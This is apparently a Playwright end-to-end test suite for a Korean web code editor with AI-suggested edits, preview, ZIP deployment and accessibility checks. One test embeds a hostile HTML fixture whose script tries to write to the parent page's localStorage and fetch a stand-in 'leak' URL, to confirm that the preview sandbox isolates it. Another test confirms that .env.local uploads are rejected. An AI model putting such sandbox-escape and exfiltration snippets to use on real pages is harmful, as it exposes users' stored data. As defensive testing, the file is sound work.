import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
test("template → edit → AI approval → preview → ZIP verification → reload", async ({
  page,
}) => {
  await page.goto("/");
  await expect(
    page.getByRole("treeitem", { name: "index.html", exact: true }),
  ).toBeVisible();
  await page.getByRole("button", { name: "새 파일", exact: true }).click();
  await page.getByLabel("파일 경로", { exact: true }).fill("notes.md");
  await page.getByRole("button", { name: "확인", exact: true }).click();
  await page.getByRole("textbox", { name: /notes.md 코드 편집기/ }).focus();
  await page.keyboard.insertText("# 저장 테스트");
  await expect(
    page.getByRole("heading", { name: "저장 테스트", exact: true }),
  ).toBeVisible();
  await page.keyboard.press("ControlOrMeta+s");
  await expect(
    page.getByText("이 기기에 저장됨", { exact: true }),
  ).toBeVisible();
  await page.getByText("버튼 색을 파랗게 바꿔줘", { exact: true }).click();
  await expect(
    page.getByRole("button", { name: "적용", exact: true }),
  ).toBeVisible();
  await page.getByRole("button", { name: "비교", exact: true }).click();
  await expect(page.getByText("style.css 변경 비교")).toBeVisible();
  await page.getByRole("button", { name: "변경 적용", exact: true }).click();
  await expect(page.getByText("적용됨", { exact: true })).toBeVisible();
  await page.getByRole("tab", { name: "미리보기" }).click();
  const preview = page.frameLocator('iframe[title="작품 미리보기"]');
  await expect(
    preview.getByRole("button", { name: "클릭해서 +1", exact: true }),
  ).toBeVisible();
  await preview
    .getByRole("button", { name: "클릭해서 +1", exact: true })
    .click();
  await expect(preview.locator("#score")).toHaveText("1");
  await page.getByRole("button", { name: "배포하기", exact: true }).click();
  await page.getByRole("button", { name: "배포 ZIP 검증" }).click();
  await expect(page.getByRole("dialog")).not.toBeVisible();
  await page.getByRole("button", { name: "배포하기" }).click();
  await expect(page.getByText("ZIP 검증 완료", { exact: true })).toBeVisible();
  await page.getByRole("button", { name: "닫기", exact: true }).click();
  await page.reload();
  await expect(
    page.getByRole("treeitem", { name: "notes.md", exact: true }),
  ).toBeVisible();
  await expect(page.getByText("적용됨", { exact: true })).toBeVisible();
  await page
    .getByRole("treeitem", { name: "notes.md", exact: true })
    .getByRole("button", { name: "notes.md", exact: true })
    .click();
  await expect(
    page.getByRole("heading", { name: "저장 테스트", exact: true }),
  ).toBeVisible();
  await page
    .getByRole("treeitem", { name: "index.html", exact: true })
    .getByRole("button", { name: "index.html", exact: true })
    .click();
  await page.screenshot({
    path: "test-results/editor-desktop.png",
    fullPage: true,
  });
});
test("keyboard, focus, theme and accessibility", async ({ page }) => {
  await page.goto("/");
  await expect(
    page.getByRole("treeitem", { name: "index.html", exact: true }),
  ).toBeVisible();
  await page.keyboard.press("ControlOrMeta+p");
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.getByLabel("파일 이름 검색").fill("style");
  await page
    .getByRole("dialog")
    .getByRole("button", { name: "style.css" })
    .click();
  await page.keyboard.press("ControlOrMeta+b");
  await expect(page.getByRole("tree")).not.toBeVisible();
  await page.keyboard.press("ControlOrMeta+b");
  const result = await new AxeBuilder({ page })
    .exclude(".monaco-editor")
    .withTags(["wcag2a", "wcag2aa"])
    .analyze();
  expect(
    result.violations.map((v) => ({
      id: v.id,
      nodes: v.nodes.map((n) => n.target),
    })),
  ).toEqual([]);
  await page.getByRole("button", { name: "테마 전환" }).click();
  await expect(page.locator("html")).toHaveAttribute("data-theme", "light");
  const light = await new AxeBuilder({ page })
    .exclude(".monaco-editor")
    .withTags(["wcag2a", "wcag2aa"])
    .analyze();
  expect(
    light.violations.map((v) => ({
      id: v.id,
      nodes: v.nodes.map((n) => n.target),
    })),
  ).toEqual([]);
});
test("duplicate tab warning and hostile HTML cannot access parent storage", async ({
  page,
  context,
}) => {
  await page.goto("/");
  await expect(page.getByRole("tree")).toBeVisible();
  const other = await context.newPage();
  await other.goto("/");
  await expect(
    page.getByText(
      "다른 탭에서도 이 프로젝트를 열었습니다. 한 탭에서만 편집하세요.",
    ),
  ).toBeVisible();
  await other.close();
  const hostile = Buffer.from(
    '<!doctype html><html><body><h1>격리 확인</h1><script>try { parent.localStorage.setItem("escaped","yes") } catch { console.log("isolated") };fetch("https://example.com/leak").catch(()=>console.log("network blocked"))</script></body></html>',
  );
  page.on("dialog", (dialog) => dialog.accept());
  await page.getByLabel("업로드할 파일").setInputFiles({
    name: "index.html",
    mimeType: "text/html",
    buffer: hostile,
  });
  await page.getByRole("tab", { name: "미리보기" }).click();
  await expect(
    page.frameLocator('iframe[title="작품 미리보기"]').getByText("격리 확인"),
  ).toBeVisible();
  await expect
    .poll(() => page.evaluate(() => localStorage.getItem("escaped")))
    .toBeNull();
  await page.getByRole("button", { name: /콘솔/ }).click();
  await expect(
    page.getByRole("button", { name: /network blocked/ }),
  ).toBeVisible();
});

test("project creation, clone, deletion and unsafe upload rejection", async ({
  page,
}) => {
  await page.goto("/");
  await expect(page.getByRole("tree")).toBeVisible();
  await page
    .locator("header")
    .getByRole("button", { name: "나의 첫 클릭 게임" })
    .click();
  await page.getByLabel("프로젝트 이름", { exact: true }).fill("검증 프로젝트");
  await page.getByRole("button", { name: "프로젝트 만들기" }).click();
  await expect(
    page
      .locator("header")
      .getByRole("button", { name: "검증 프로젝트", exact: true }),
  ).toBeVisible();
  await page.getByLabel("업로드할 파일").setInputFiles({
    name: ".env.local",
    mimeType: "text/plain",
    buffer: Buffer.from("test-not-a-secret"),
  });
  await expect(page.getByText(/라운지에서 금지한 파일입니다/)).toBeVisible();
  await page
    .locator("header")
    .getByRole("button", { name: "검증 프로젝트", exact: true })
    .click();
  await page
    .getByRole("button", { name: "검증 프로젝트 복제", exact: true })
    .click();
  await expect(
    page
      .locator("header")
      .getByRole("button", { name: "검증 프로젝트 복사본", exact: true }),
  ).toBeVisible();
  await page
    .locator("header")
    .getByRole("button", { name: "검증 프로젝트 복사본", exact: true })
    .click();
  page.on("dialog", (dialog) => dialog.accept());
  await page
    .getByRole("button", {
      name: "검증 프로젝트 복사본 프로젝트 삭제",
      exact: true,
    })
    .click();
  await expect(
    page
      .getByRole("dialog")
      .getByRole("button", { name: "검증 프로젝트 복사본", exact: true }),
  ).not.toBeVisible();
});
test("stopped AI reply is restored without applying a pending change", async ({
  page,
}) => {
  await page.goto("/");
  await expect(page.getByRole("tree")).toBeVisible();
  await page.getByText("버튼 색을 파랗게 바꿔줘", { exact: true }).click();
  await page.getByRole("button", { name: "AI 응답 중단" }).click();
  await expect(page.getByText("중단된 응답", { exact: true })).toBeVisible();
  await page.reload();
  await expect(page.getByText("중단된 응답", { exact: true })).toBeVisible();
  await expect(
    page.getByRole("button", { name: "적용", exact: true }),
  ).not.toBeVisible();
});
